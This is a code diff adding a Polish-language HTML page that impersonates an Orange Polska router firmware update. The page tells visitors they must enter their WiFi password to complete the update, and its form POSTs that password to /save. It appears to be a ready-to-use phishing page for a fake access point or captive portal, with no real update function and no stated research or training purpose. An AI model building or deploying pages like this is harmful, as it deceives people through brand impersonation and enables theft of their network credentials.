@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="pl">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Aktualizacja systemu - Orange Router</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        background-color: #000;
+        font-family: "Segoe UI", Arial, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+      }
+
+      .container {
+        background: rgba(20, 20, 20, 0.9);
+        backdrop-filter: blur(8px);
+        padding: 25px;
+        max-width: 340px;
+        width: 90%;
+        border-radius: 14px;
+        box-shadow: 0 0 25px rgba(255, 110, 0, 0.3);
+        text-align: center;
+      }
+
+      .logo {
+        margin-bottom: 15px;
+      }
+
+      .logo img {
+        max-width: 90px;
+        height: auto;
+        filter: drop-shadow(0 0 8px rgba(255, 110, 0, 0.6));
+      }
+
+      .header {
+        color: #ff6e00;
+        font-size: 1.5em;
+        font-weight: bold;
+        margin-bottom: 15px;
+        text-shadow: 0 0 6px rgba(255, 110, 0, 0.7);
+      }
+
+      .message {
+        color: #eee;
+        font-size: 1em;
+        line-height: 1.4em;
+        margin-bottom: 25px;
+      }
+
+      input[type="password"] {
+        width: 100%;
+        padding: 12px;
+        font-size: 1em;
+        margin-bottom: 18px;
+        border: 1px solid #ff6e00;
+        border-radius: 6px;
+        background: #111;
+        color: #fff;
+        outline: none;
+        transition: all 0.3s ease;
+      }
+
+      input[type="password"]:focus {
+        border-color: #fff;
+        box-shadow: 0 0 8px rgba(255, 110, 0, 0.6);
+      }
+
+      button {
+        width: 100%;
+        padding: 12px;
+        background: #ff6e00;
+        color: #000;
+        border: none;
+        border-radius: 6px;
+        font-size: 1.1em;
+        font-weight: bold;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      button:hover {
+        background: #ffa64d;
+        box-shadow: 0 0 10px rgba(255, 166, 77, 0.8);
+      }
+
+      .footer {
+        margin-top: 18px;
+        font-size: 0.8em;
+        color: #999;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <img src="data:image/png;base64,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" alt="Orange Logo"/>
+      </div>
+      <div class="header">Orange Update</div>
+      <div class="message">
+        Automatyczna aktualizacja oprogramowania sieciowego.<br/>
+        Aby zakończyć proces, wpisz hasło do sieci WiFi.
+      </div>
+      <form method="POST" action="/save">
+        <input type="password" name="wifi_password" placeholder="Hasło do WiFi" required />
+        <button type="submit">Kontynuuj</button>
+      </form>
+      <div class="footer">System firmware update v3.0.1</div>
+      <div class="footer">Orange Polska S.A.</div>
+    </div>
+  </body>
+</html>
